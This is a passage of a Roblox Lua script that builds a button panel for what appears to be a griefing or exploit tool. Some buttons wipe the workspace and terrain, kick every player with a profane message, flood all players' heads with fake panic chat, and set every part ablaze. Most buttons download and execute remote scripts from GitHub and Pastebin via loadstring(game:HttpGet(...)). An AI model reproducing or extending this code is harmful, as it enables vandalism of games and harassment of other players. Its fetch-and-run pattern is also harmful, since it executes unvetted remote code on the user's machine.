object:IsA("UITextSizeConstraint") or object:IsA("UIVerticalScrollBar") or object:IsA("Vector3Value") or object:IsA("VehicleSeat") or object:IsA("VideoFrame") or object:IsA("ViewportFrame") or object:IsA("VisualEffect") or object:IsA("VoiceChatService") or object:IsA("VolumeController") or object:IsA("Weld") or object:IsA("WeldConstraint") or object:IsA("WorldRoot") then
            object:Destroy()
            workspace:ClearAllChildren()
            workspace:FindFirstChildOfClass('Terrain'):Clear()
        end
    end
end
)

ocnf19 = Instance.new("TextButton")
ocnf19.Parent = Others
ocnf19.Name = "ocnf19"
ocnf19.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf19.Position = UDim2.new(0.00996587239, 0, 0.750, 0)
ocnf19.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf19.BorderColor3 = Color3.new(1, 0, 0)
ocnf19.BorderSizePixel = 3
ocnf19.TextColor3 = Color3.new(1, 1, 1)
ocnf19.TextScaled = true
ocnf19.Font = Enum.Font.Roboto
ocnf19.Text = "Bubble Chat"
ocnf19.Visible = false
ocnf19.MouseButton1Click:Connect(function()
while true do
    local messages = {
        "WHAT IS HAPPENING!?",
        "HELP ME!",
        "1X98N6EX6 IS HERE!",
        "LEAVE FROM THE GAME!",
        "1X98N6EX6 IS DOMINATING!",
        "1X98N6EX6 IS HACKING THE GAME!",
        "MOM IM SCARED!",
        "1X98N6EX6 PLEASE FORGIVE ME!"
    }
    for i, v in pairs(game.Players:GetChildren()) do
        for _, msg in ipairs(messages) do
            game:GetService("Chat"):Chat(v.Character.Head, msg)
            wait(1)
        end
    end
    wait(0.2)
end
end)

ocnf20 = Instance.new("TextButton")
ocnf20.Parent = Others
ocnf20.Name = "ocnf20"
ocnf20.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf20.Position = UDim2.new(0.18, 0, 0.750, 0)
ocnf20.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf20.BorderColor3 = Color3.new(1, 0, 0)
ocnf20.BorderSizePixel = 3
ocnf20.TextColor3 = Color3.new(1, 1, 1)
ocnf20.TextScaled = true
ocnf20.Font = Enum.Font.Roboto
ocnf20.Text = "billboard"
ocnf20.Visible = false
ocnf20.MouseButton1Click:Connect(function()
    local p = game.Players.LocalPlayer
    local char = p.Character
    local txt = Instance.new("BillboardGui", char)
    txt.Adornee = char.Head
    txt.Name = "_status"
    txt.Size = UDim2.new(2, 0, 1, 0)
    txt.StudsOffset = Vector3.new(-4, 5, 0)
    local text = Instance.new("TextLabel", txt)
    text.Size = UDim2.new(5, 0, 5, 0)
    text.FontSize = "Size24"
    text.TextScaled = true
    text.TextColor3 = Color3.new(1,0,0)
    text.BackgroundTransparency = 1
    text.TextTransparency = 0
    text.TextStrokeTransparency = 0
    text.Font = "Creepster"
    text.TextStrokeColor3 = Color3.new(0,0,0)
    text.Text = "1x98n6ex6"
end)

ocnf21 = Instance.new("TextButton")
ocnf21.Parent = Others
ocnf21.Name = "ocnf21"
ocnf21.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf21.Position = UDim2.new(0.35, 0, 0.750, 0)
ocnf21.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf21.BorderColor3 = Color3.new(1, 0, 0)
ocnf21.BorderSizePixel = 3
ocnf21.TextColor3 = Color3.new(1, 1, 1)
ocnf21.TextScaled = true
ocnf21.Font = Enum.Font.Roboto
ocnf21.Text = "Colors all"
ocnf21.Visible = false

ocnf22 = Instance.new("TextButton")
ocnf22.Parent = Others
ocnf22.Name = "ocnf22"
ocnf22.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf22.Position = UDim2.new(0.52, 0, 0.750, 0)
ocnf22.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf22.BorderColor3 = Color3.new(1, 0, 0)
ocnf22.BorderSizePixel = 3
ocnf22.TextColor3 = Color3.new(1, 1, 1)
ocnf22.TextScaled = true
ocnf22.Font = Enum.Font.Roboto
ocnf22.Text = "Kick all"
ocnf22.Visible = false
ocnf22.MouseButton1Click:Connect(function()
for i, player in ipairs(Players:GetPlayers()) do
    
    if player.UserId ~= 0 then 
        player:Kick("THE GAME HAS BEEN FUCKED UP!!!!!!.")
    end
end
    end)

ocnf23 = Instance.new("TextButton")
ocnf23.Parent = Others
ocnf23.Name = "ocnf23"
ocnf23.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnf23.Position = UDim2.new(0.69, 0, 0.750, 0)
ocnf23.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf23.BorderColor3 = Color3.new(1, 0, 0)
ocnf23.BorderSizePixel = 3
ocnf23.TextColor3 = Color3.new(1, 1, 1)
ocnf23.TextScaled = true
ocnf23.Font = Enum.Font.Roboto
ocnf23.Text = "666"
ocnf23.Visible = false
ocnf23.MouseButton1Click:Connect(function()
	for i,v in next,workspace:children''do
		if(v:IsA'BasePart')then
			me=v;
			bbg=Instance.new('BillboardGui',me);
			bbg.Name='stuf';
			bbg.Adornee=me;
			bbg.Size=UDim2.new(2.5,0,2.5,0)
			--bbg.StudsOffset=Vector3.new(0,2,0)
			tlb=Instance.new'TextLabel';
			tlb.Text='666 666 666 666 666 666';
			tlb.Font='SourceSansBold';
			tlb.FontSize='Size48';
			tlb.TextColor3=Color3.new(1,0,0);
			tlb.Size=UDim2.new(1.25,0,1.25,0);
			tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
			tlb.BackgroundTransparency=0;
			tlb.Parent=bbg;
		end;end;
	function xds(dd)
		for i,v in next,dd:children''do
			if(v:IsA'BasePart')then
				v.BrickColor=BrickColor.new'Really black';
				v.TopSurface='Smooth';
				v.BottomSurface='Smooth';
				s=Instance.new('SelectionBox',v);
				s.Adornee=v;
				s.Color=BrickColor.new'Really red';
				a=Instance.new('PointLight',v);
				a.Color=Color3.new(1,0,0);
				a.Range=15;
				a.Brightness=5;
				f=Instance.new('Fire',v);
				f.Size=19;
				f.Heat=22;
			end;
			game.Lighting.TimeOfDay=0;
			game.Lighting.Brightness=0;
			game.Lighting.ShadowColor=Color3.new(0,0,0);
			game.Lighting.Ambient=Color3.new(1,0,0);
			game.Lighting.FogEnd=200;
			game.Lighting.FogColor=Color3.new(0,0,0);
			local dec = 'http://www.roblox.com/asset/?id=19399245';
			local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
			--coroutine.wrap(function()
			--for ,_ in pairs(fac) do
			--local ddec = Instance.new("Decal", v)
			--ddec.Face = 
			--ddec.Texture = dec
			--end end)()
			if #(v:GetChildren())>0 then
				xds(v) 
			end
		end
	end
	xds(game.Workspace)
end)

ocnf24 = Instance.new("TextButton")
ocnf24.Parent = Others
ocnf24.Name = "ocnf24"
ocnf24.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnf24.Position = UDim2.new(0.86, 0, 0.750, 0)
ocnf24.BackgroundColor3 = Color3.new(0, 0, 0)
ocnf24.BorderColor3 = Color3.new(1, 0, 0)
ocnf24.BorderSizePixel = 3
ocnf24.TextColor3 = Color3.new(1, 1, 1)
ocnf24.TextScaled = true
ocnf24.Font = Enum.Font.Roboto
ocnf24.Text = "Particles 2"
ocnf24.Visible = false
ocnf24.MouseButton1Click:Connect(function()
    local function applyParticleEffect(part)
        if part:IsA("BasePart") then
            local pe2 = Instance.new("ParticleEmitter", part)
            pe2.Texture = "rbxassetid://107978443801641"
            pe2.VelocitySpread = 50
            pe2.Lifetime = NumberRange.new(1, 5)
            pe2.Rate = 25
            pe2.Speed = NumberRange.new(10, 20)
            pe2.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1.2), NumberSequenceKeypoint.new(1, 0)})

            local se2 = Instance.new("ParticleEmitter", part)
            se2.Texture = "rbxassetid://107978443801641"
            se2.VelocitySpread = 50
            se2.Lifetime = NumberRange.new(1.5, 5.5)
            se2.Rate = 20
            se2.Speed = NumberRange.new(15, 25)
            se2.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0)})

            local fe2 = Instance.new("ParticleEmitter", part)
            fe2.Texture = "rbxassetid://107978443801641"
            fe2.VelocitySpread = 50
            fe2.Lifetime = NumberRange.new(2, 5)
            fe2.Rate = 15
            fe2.Speed = NumberRange.new(20, 30)
            fe2.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.8), NumberSequenceKeypoint.new(1, 0)})
        end
    end

    local function processInstance(instance)
        if instance:IsA("BasePart") then
            applyParticleEffect(instance)
        end

        for _, child in pairs(instance:GetChildren()) do
            processInstance(child)
        end
    end

    
    processInstance(game.Workspace)
end)


 ocnfw25 = Instance.new("TextButton")
ocnfw25.Parent = Others
ocnfw25.Name = "ocnfw25"
ocnfw25.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw25.Position = UDim2.new(0.00996587239, 0, 0.03, 0)
ocnfw25.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw25.BorderColor3 = Color3.new(1, 0, 0)
ocnfw25.BorderSizePixel = 3
ocnfw25.TextColor3 = Color3.new(1, 1, 1)
ocnfw25.TextScaled = true
ocnfw25.Font = Enum.Font.Roboto
ocnfw25.Text = "Grab Knife V1"
ocnfw25.Visible = false
ocnfw25.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Grab%20Knife%20V1.lua.txt"))()
end)

 ocnfw26 = Instance.new("TextButton")
ocnfw26.Parent = Others
ocnfw26.Name = "ocnfw26"
ocnfw26.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw26.Position = UDim2.new(0.18, 0, 0.03, 0)
ocnfw26.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw26.BorderColor3 = Color3.new(1, 0, 0)
ocnfw26.BorderSizePixel = 3
ocnfw26.TextColor3 = Color3.new(1, 1, 1)
ocnfw26.TextScaled = true
ocnfw26.Font = Enum.Font.Roboto
ocnfw26.Text = "Grab Knife V2"
ocnfw26.Visible = false
ocnfw26.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BRecharacter%5D%20Grab%20Knife%20V2.txt"))()
end)

 ocnfw27 = Instance.new("TextButton")
ocnfw27.Parent = Others
ocnfw27.Name = "ocnfw27"
ocnfw27.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw27.Position = UDim2.new(0.35, 0, 0.03, 0)
ocnfw27.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw27.BorderColor3 = Color3.new(1, 0, 0)
ocnfw27.BorderSizePixel = 3
ocnfw27.TextColor3 = Color3.new(1, 1, 1)
ocnfw27.TextScaled = true
ocnfw27.Font = Enum.Font.Roboto
ocnfw27.Text = "Grab Knife V3"
ocnfw27.Visible = false
ocnfw27.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Grab%20Knife%20V3.lua.txt"))()
end)

 ocnfw28 = Instance.new("TextButton")
ocnfw28.Parent = Others
ocnfw28.Name = "ocnfw28"
ocnfw28.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw28.Position = UDim2.new(0.52, 0, 0.03, 0)
ocnfw28.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw28.BorderColor3 = Color3.new(1, 0, 0)
ocnfw28.BorderSizePixel = 3
ocnfw28.TextColor3 = Color3.new(1, 1, 1)
ocnfw28.TextScaled = true
ocnfw28.Font = Enum.Font.Roboto
ocnfw28.Text = "Grab Knife V4"
ocnfw28.Visible = false
ocnfw28.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BRecharacter%5D%20Grab%20Knife%20V4.txt"))()
end)

 ocnfw29 = Instance.new("TextButton")
ocnfw29.Parent = Others
ocnfw29.Name = "ocnfw29"
ocnfw29.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw29.Position = UDim2.new(0.69, 0, 0.03, 0)
ocnfw29.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw29.BorderColor3 = Color3.new(1, 0, 0)
ocnfw29.BorderSizePixel = 3
ocnfw29.TextColor3 = Color3.new(1, 1, 1)
ocnfw29.TextScaled = true
ocnfw29.Font = Enum.Font.Roboto
ocnfw29.Text = "Kitchen Gun"
ocnfw29.Visible = false
ocnfw29.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Kitchen%20Gun.txt"))()
end)

 ocnfw30 = Instance.new("TextButton")
ocnfw30.Parent = Others
ocnfw30.Name = "ocnfw30"
ocnfw30.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnfw30.Position = UDim2.new(0.86, 0, 0.03, 0)
ocnfw30.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw30.BorderColor3 = Color3.new(1, 0, 0)
ocnfw30.BorderSizePixel = 3
ocnfw30.TextColor3 = Color3.new(1, 1, 1)
ocnfw30.TextScaled = true
ocnfw30.Font = Enum.Font.Roboto
ocnfw30.Text = "Nuke Launcher"
ocnfw30.Visible = false
ocnfw30.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Nuke%20Launcher.lua.txt"))()
end)

 ocnfw31 = Instance.new("TextButton")
ocnfw31.Parent = Others
ocnfw31.Name = "ocnfw31"
ocnfw31.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw31.Position = UDim2.new(0.00996587239, 0, 0.229999959, 0)
ocnfw31.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw31.BorderColor3 = Color3.new(1, 0, 0)
ocnfw31.BorderSizePixel = 3
ocnfw31.TextColor3 = Color3.new(1, 1, 1)
ocnfw31.TextScaled = true
ocnfw31.Font = Enum.Font.SourceSans
ocnfw31.Text = "Xester"
ocnfw31.Visible = false
ocnfw31.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/xester/refs/heads/main/qC7MUFRJ.txt"))()
end)

 ocnfw32 = Instance.new("TextButton")
ocnfw32.Parent = Others
ocnfw32.Name = "ocnfw32"
ocnfw32.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw32.Position = UDim2.new(0.18, 0, 0.229999959, 0)
ocnfw32.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw32.BorderColor3 = Color3.new(1, 0, 0)
ocnfw32.BorderSizePixel = 3
ocnfw32.TextColor3 = Color3.new(1, 1, 1)
ocnfw32.TextScaled = true
ocnfw32.Font = Enum.Font.SourceSans
ocnfw32.Text = "Spectrum Glitcher"
ocnfw32.Visible = false
ocnfw32.MouseButton1Click:Connect(function()
	notif({
		Text = "Modes: E,R,T,Y,U,F,G. Check Console For More (press F9 or type /console)",
		Duration = 6,
		topm = "INFORMATION!"
	})
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Spectrum%20Glitcher.txt"))()
end)

 ocnfw33 = Instance.new("TextButton")
ocnfw33.Parent = Others
ocnfw33.Name = "ocnfw33"
ocnfw33.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw33.Position = UDim2.new(0.35, 0, 0.229999959, 0)
ocnfw33.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw33.BorderColor3 = Color3.new(1, 0, 0)
ocnfw33.BorderSizePixel = 3
ocnfw33.TextColor3 = Color3.new(1, 1, 1)
ocnfw33.TextScaled = true
ocnfw33.Font = Enum.Font.Roboto
ocnfw33.Text = "John Doe"
ocnfw33.Visible = false
ocnfw33.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BRecharacter%5D%20John%20Doe.txt"))()
end)

 ocnfw34 = Instance.new("TextButton")
ocnfw34.Parent = Others
ocnfw34.Name = "ocnfw34"
ocnfw34.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw34.Position = UDim2.new(0.52, 0, 0.229999959, 0)
ocnfw34.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw34.BorderColor3 = Color3.new(1, 0, 0)
ocnfw34.BorderSizePixel = 3
ocnfw34.TextColor3 = Color3.new(1, 1, 1)
ocnfw34.TextScaled = true
ocnfw34.Font = Enum.Font.Roboto
ocnfw34.Text = "Nebula Glitcher"
ocnfw34.Visible = false
ocnfw34.MouseButton1Click:Connect(function()
-- credit Nebula_Zorua
loadstring(game:HttpGet("https://pastebin.com/raw/j09BnGB3"))()
end)

 ocnfw35 = Instance.new("TextButton")
ocnfw35.Parent = Others
ocnfw35.Name = "ocnfw35"
ocnfw35.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw35.Position = UDim2.new(0.69, 0, 0.229999959, 0)
ocnfw35.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw35.BorderColor3 = Color3.new(1, 0, 0)
ocnfw35.BorderSizePixel = 3
ocnfw35.TextColor3 = Color3.new(1, 1, 1)
ocnfw35.TextScaled = true
ocnfw35.Font = Enum.Font.Roboto
ocnfw35.Text = "Ban Hammer"
ocnfw35.Visible = false
ocnfw35.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Ban%20Hammer%20v2.txt"))()
end)

 ocnfw36 = Instance.new("TextButton")
ocnfw36.Parent = Others
ocnfw36.Name = "ocnfw36"
ocnfw36.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnfw36.Position = UDim2.new(0.86, 0, 0.229999959, 0)
ocnfw36.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw36.BorderColor3 = Color3.new(1, 0, 0)
ocnfw36.BorderSizePixel = 3
ocnfw36.TextColor3 = Color3.new(1, 1, 1)
ocnfw36.TextScaled = true
ocnfw36.Font = Enum.Font.Roboto
ocnfw36.Text = "Sin Dragon Head"
ocnfw36.Visible = false
ocnfw36.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Sin%20Dragon%20Head.txt"))()
end)

 ocnfw37 = Instance.new("TextButton")
ocnfw37.Parent = Others
ocnfw37.Name = "ocnfw37"
ocnfw37.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw37.Position = UDim2.new(0.00996587239, 0, 0.43, 0)
ocnfw37.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw37.BorderColor3 = Color3.new(1, 0, 0)
ocnfw37.BorderSizePixel = 3
ocnfw37.TextColor3 = Color3.new(1, 1, 1)
ocnfw37.TextScaled = true
ocnfw37.Font = Enum.Font.Roboto
ocnfw37.Text = "Good Cop Bad Cop"
ocnfw37.Visible = false
ocnfw37.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/good-cop-bad-coop/refs/heads/main/KwuminKa.txt"))()
end)

 ocnfw38 = Instance.new("TextButton")
ocnfw38.Parent = Others
ocnfw38.Name = "ocnfw38"
ocnfw38.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw38.Position = UDim2.new(0.18, 0, 0.43, 0)
ocnfw38.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw38.BorderColor3 = Color3.new(1, 0, 0)
ocnfw38.BorderSizePixel = 3
ocnfw38.TextColor3 = Color3.new(1, 1, 1)
ocnfw38.TextScaled = true
ocnfw38.Font = Enum.Font.Roboto
ocnfw38.Text = "Vereus"
ocnfw38.Visible = false
ocnfw38.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/nicolasbarbosa323/xester/refs/heads/main/fLrx77PM.txt"))()
end)

 ocnfw39 = Instance.new("TextButton")
ocnfw39.Parent = Others
ocnfw39.Name = "ocnfw39"
ocnfw39.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw39.Position = UDim2.new(0.35, 0, 0.43, 0)
ocnfw39.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw39.BorderColor3 = Color3.new(1, 0, 0)
ocnfw39.BorderSizePixel = 3
ocnfw39.TextColor3 = Color3.new(1, 1, 1)
ocnfw39.TextScaled = true
ocnfw39.Font = Enum.Font.Roboto
ocnfw39.Text = "Lost Hope Scythe V2"
ocnfw39.Visible = false
ocnfw39.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Lost%20Hope%20Scythe%20v2.txt"))()
end)

 ocnfw40 = Instance.new("TextButton")
ocnfw40.Parent = Others
ocnfw40.Name = "ocnfw40"
ocnfw40.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw40.Position = UDim2.new(0.52, 0, 0.43, 0)
ocnfw40.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw40.BorderColor3 = Color3.new(1, 0, 0)
ocnfw40.BorderSizePixel = 3
ocnfw40.TextColor3 = Color3.new(1, 1, 1)
ocnfw40.TextScaled = true
ocnfw40.Font = Enum.Font.Roboto
ocnfw40.Text = "Mini King Neflhelm"
ocnfw40.Visible = false
ocnfw40.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/T6Z3rNHD"))()
end)

 ocnfw41 = Instance.new("TextButton")
ocnfw41.Parent = Others
ocnfw41.Name = "ocnfw41"
ocnfw41.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw41.Position = UDim2.new(0.69, 0, 0.43, 0)
ocnfw41.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw41.BorderColor3 = Color3.new(1, 0, 0)
ocnfw41.BorderSizePixel = 3
ocnfw41.TextColor3 = Color3.new(1, 1, 1)
ocnfw41.TextScaled = true
ocnfw41.Font = Enum.Font.Roboto
ocnfw41.Text = "Banisher Infinite"
ocnfw41.Visible = false
ocnfw41.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Banisher%20Infinite.txt"))()
end)

 ocnfw42 = Instance.new("TextButton")
ocnfw42.Parent = Others
ocnfw42.Name = "ocnfw42"
ocnfw42.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnfw42.Position = UDim2.new(0.86, 0, 0.43, 0)
ocnfw42.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw42.BorderColor3 = Color3.new(1, 0, 0)
ocnfw42.BorderSizePixel = 3
ocnfw42.TextColor3 = Color3.new(1, 1, 1)
ocnfw42.TextScaled = true
ocnfw42.Font = Enum.Font.Roboto
ocnfw42.Text = "Pandora"
ocnfw42.Visible = false
ocnfw42.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Pandora.txt"))()
end)

 ocnfw43 = Instance.new("TextButton")
ocnfw43.Parent = Others
ocnfw43.Name = "ocnfw43"
ocnfw43.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw43.Position = UDim2.new(0.00996587239, 0, 0.63, 0)
ocnfw43.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw43.BorderColor3 = Color3.new(1, 0, 0)
ocnfw43.BorderSizePixel = 3
ocnfw43.TextColor3 = Color3.new(1, 1, 1)
ocnfw43.TextScaled = true
ocnfw43.Font = Enum.Font.Roboto
ocnfw43.Text = "Banisher"
ocnfw43.Visible = false
ocnfw43.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Banisher.lua.txt"))()
end)

 ocnfw44 = Instance.new("TextButton")
ocnfw44.Parent = Others
ocnfw44.Name = "ocnfw44"
ocnfw44.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw44.Position = UDim2.new(0.18, 0, 0.63, 0)
ocnfw44.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw44.BorderColor3 = Color3.new(1, 0, 0)
ocnfw44.BorderSizePixel = 3
ocnfw44.TextColor3 = Color3.new(1, 1, 1)
ocnfw44.TextScaled = true
ocnfw44.Font = Enum.Font.Roboto
ocnfw44.Text = "Plane"
ocnfw44.Visible = false
ocnfw44.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BRecharacter%5D%20911%20Plane.txt"))()
end)

 ocnfw45 = Instance.new("TextButton")
ocnfw45.Parent = Others
ocnfw45.Name = "ocnfw45"
ocnfw45.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw45.Position = UDim2.new(0.35, 0, 0.63, 0)
ocnfw45.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw45.BorderColor3 = Color3.new(1, 0, 0)
ocnfw45.BorderSizePixel = 3
ocnfw45.TextColor3 = Color3.new(1, 1, 1)
ocnfw45.TextScaled = true
ocnfw45.Font = Enum.Font.Roboto
ocnfw45.Text = "Sin Unleashed"
ocnfw45.Visible = false
ocnfw45.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Sin%20Unleashed.lua.txt"))()
end)

 ocnfw46 = Instance.new("TextButton")
ocnfw46.Parent = Others
ocnfw46.Name = "ocnfw46"
ocnfw46.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw46.Position = UDim2.new(0.52, 0, 0.63, 0)
ocnfw46.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw46.BorderColor3 = Color3.new(1, 0, 0)
ocnfw46.BorderSizePixel = 3
ocnfw46.TextColor3 = Color3.new(1, 1, 1)
ocnfw46.TextScaled = true
ocnfw46.Font = Enum.Font.Roboto
ocnfw46.Text = "The Angel"
ocnfw46.Visible = false
ocnfw46.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/The%20Angel.txt"))()
end)

 ocnfw47 = Instance.new("TextButton")
ocnfw47.Parent = Others
ocnfw47.Name = "ocnfw47"
ocnfw47.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfw47.Position = UDim2.new(0.69, 0, 0.63, 0)
ocnfw47.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw47.BorderColor3 = Color3.new(1, 0, 0)
ocnfw47.BorderSizePixel = 3
ocnfw47.TextColor3 = Color3.new(1, 1, 1)
ocnfw47.TextScaled = true
ocnfw47.Font = Enum.Font.Roboto
ocnfw47.Text = "Banisher Gun V3"
ocnfw47.Visible = false
ocnfw47.MouseButton1Click:Connect(function()
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.Name = "skillsbv3"

local skillbv3lab = Instance.new("TextLabel")
skillbv3lab.Parent = screenGui
skillbv3lab.Name = "TextLabel"
skillbv3lab.Text = "/ Z, Q, E, F" 
skillbv3lab.Position = UDim2.new(0.219999999, 0, 0.899999976, 0) 
skillbv3lab.Size = UDim2.new(0.25999999, 0, 0.0700000003, 0) 
skillbv3lab.BackgroundColor3 = Color3.new(1, 1, 1) 
skillbv3lab.BackgroundTransparency = 5 
skillbv3lab.TextColor3 = Color3.new(184, 0, 0) 
skillbv3lab.TextScaled = true 
skillbv3lab.Font = Enum.Font.Fantasy
skillbv3lab.BorderSizePixel = 2
skillbv3lab.BorderColor3 = Color3.new(0, 0, 0)
skillbv3lab.TextStrokeColor3 = Color3.new(0, 0, 0)
skillbv3lab.TextStrokeTransparency = 0

loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Banisher%20Gun%20V3.txt"))()
end)

 ocnfw48 = Instance.new("TextButton")
ocnfw48.Parent = Others
ocnfw48.Name = "ocnfw48"
ocnfw48.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnfw48.Position = UDim2.new(0.86, 0, 0.63, 0)
ocnfw48.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw48.BorderColor3 = Color3.new(1, 0, 0)
ocnfw48.BorderSizePixel = 3
ocnfw48.TextColor3 = Color3.new(1, 1, 1)
ocnfw48.TextScaled = true
ocnfw48.Font = Enum.Font.Roboto
ocnfw48.Text = "Clown Van Kidnapping Gui"
ocnfw48.Visible = false
ocnfw48.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/clown-van-edit.txt"))()
end)

 ocnfw49 = Instance.new("TextButton")
ocnfw49.Parent = Others
ocnfw49.Name = "ocnfw49"
ocnfw49.Size = UDim2.new(0.473003626, 0, 0.101999998, 0)
ocnfw49.Position = UDim2.new(0.519000053, 0, 0.799999893, 0)
ocnfw49.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw49.BorderColor3 = Color3.new(1, 0, 0)
ocnfw49.BorderSizePixel = 2
ocnfw49.TextColor3 = Color3.new(1, 1, 1)
ocnfw49.TextScaled = true
ocnfw49.Font = Enum.Font.Roboto
ocnfw49.Text = "Revenge Hands"
ocnfw49.Visible = false
ocnfw49.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/reevenge%20hands.txt'))()
end)

 ocnfw50 = Instance.new("TextButton")
ocnfw50.Parent = Others
ocnfw50.Name = "ocnfw50"
ocnfw50.Size = UDim2.new(0.490003586, 0, 0.101999998, 0)
ocnfw50.Position = UDim2.new(0.00999999978, 0, 0.800000012, 0)
ocnfw50.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfw50.BorderColor3 = Color3.new(1, 0, 0)
